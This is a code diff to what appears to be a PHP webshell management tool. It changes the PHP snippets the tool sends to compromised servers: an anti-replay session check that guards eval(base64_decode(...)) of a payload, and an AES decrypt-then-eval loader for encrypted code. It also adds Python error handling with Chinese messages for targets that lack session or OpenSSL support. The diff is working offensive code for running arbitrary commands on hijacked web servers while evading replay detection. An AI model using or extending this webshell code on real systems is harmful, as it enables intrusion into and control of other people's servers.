@@ -360,7 +360,9 @@ decoder_echo(($_SESSION['SESSION_NAME']=rand()%10000).'');
 
 ANTIREPLAY_VERIFY_PHP = compress_phpcode_template(
     """
-if(KEY == $_SESSION[SESSION_NAME]) {
+if(!isset($_SESSION[SESSION_NAME])){
+    decoder_echo("WRONG_NO_SESSION");
+}else if(KEY == $_SESSION[SESSION_NAME]) {
     eval(base64_decode(PAYLOAD_B64));
     unset($_SESSION[SESSION_NAME]);
 }else{
@@ -447,7 +449,9 @@ function aes_dec($encryptedData) {
     );
     unset($_SESSION[SESSION_NAME]);
 }
-if(extension_loaded('openssl')) {
+if(!isset($_SESSION[SESSION_NAME])){
+    decoder_echo("WRONG_NO_SESSION");
+}else if(extension_loaded('openssl')) {
     array_push($decoder_hooks, "aes_enc");
     $code = aes_dec(CODE_ENC);
     eval($code);
@@ -869,6 +873,8 @@ class PHPWebshell(PHPSessionInterface):
                 .replace("    ", "")
             )
             result = await submitter(code)
+            if result == "WRONG_NO_SESSION":
+                raise exceptions.TargetRuntimeError("部署反重放失败，目标不支持session")
             if result == "WRONG_BAD_KEY":
                 raise exceptions.TargetRuntimeError("部署反重放失败，key不一致")
             return result
@@ -916,6 +922,8 @@ class PHPWebshell(PHPSessionInterface):
                 .replace("CODE_ENC", repr(base64_encode(payload_enc)))
                 .replace("    ", "")
             )
+            if result_enc == "WRONG_NO_SESSION":
+                raise exceptions.TargetRuntimeError("目标不支持session")
             if result_enc == "WRONG_NO_OPENSSL":
                 raise exceptions.TargetRuntimeError("目标不支持openssl")
             if not result_enc:
